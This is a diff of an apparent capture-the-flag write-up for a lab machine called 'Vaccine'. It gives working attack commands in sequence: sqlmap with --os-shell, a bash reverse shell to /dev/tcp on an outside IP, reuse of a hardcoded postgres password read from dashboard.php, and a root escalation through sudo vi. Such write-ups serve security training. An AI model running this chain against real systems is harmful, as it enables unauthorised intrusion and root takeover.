@@ -106,37 +106,49 @@ source: https://portswigger.net/web-security/sql-injection/union-attacks
 
 	sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=eig0j4h3v77v8prj79sug2hu50" --os-shell
 
-
-
----------------------------------------------------------
 // upgrade connection with nc listiner on port 1234
-bash -c 'bash -i >& /dev/tcp/10.10.16.66/1234 0>&1'
+
+	bash -c 'bash -i >& /dev/tcp/10.10.16.7/1234 0>&1'
 
 // upgrade nc shell
-SHELL=/bin/bash script -q /dev/null
+
+	SHELL=/bin/bash script -q /dev/null
+// Now when we got shell lets dig in www/ directory
+
+	postgres@vaccine:/var/www/html$ cat dashboard.php
+
+	try {
+	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+	}
+
+// now we can upgrade our shell
+
+	postgres@vaccine:$ python3 -c "import pty;pty.spawn('/bin/bash')"
+	P@s5w0rd!
+// Or just connect SSH
+
+	ssh postgres@10.10.10.46
+	P@s5w0rd!
 
 
-postgres@vaccine:/var/www/html$ cat dashboard.php
+// we can see that we root privilleged with vi to 'pg_hba.conf' configuration file
 
-try {
-  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
-}
+	postgres@vaccine:~$ sudo -l
+	[sudo] password for postgres: 
+	Matching Defaults entries for postgres on vaccine:
+	    env_reset, mail_badpass,
+	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+	User postgres may run the following commands on vaccine:
+	    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+// Run that file with sudo
+	    
+	postgres@vaccine:~$ sudo vi /etc/postgresql/11/main/pg_hba.conf 
+// Enter
 
--------------------1 way--------------
-postgres@vaccine:$ python3 -c "import pty;pty.spawn('/bin/bash')"
-P@s5w0rd!
-------------------2 way ---------------
-ssh open so....
-ssh postgres@10.10.10.46
-P@s5w0rd!
+	root@vaccine:/var/lib/postgresql# id
+	uid=0(root) gid=0(root) groups=0(root)
+// we got the flag
 
-
-// add root privilleged configuration file
-sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
-// add
-:!/bin/bash
-
-
-root@vaccine:~# cat root.txt
-dd6e058e814260bc70e9bbdef2715849
+	root@vaccine:~# cat root.txt
+	dd6e058e8.................
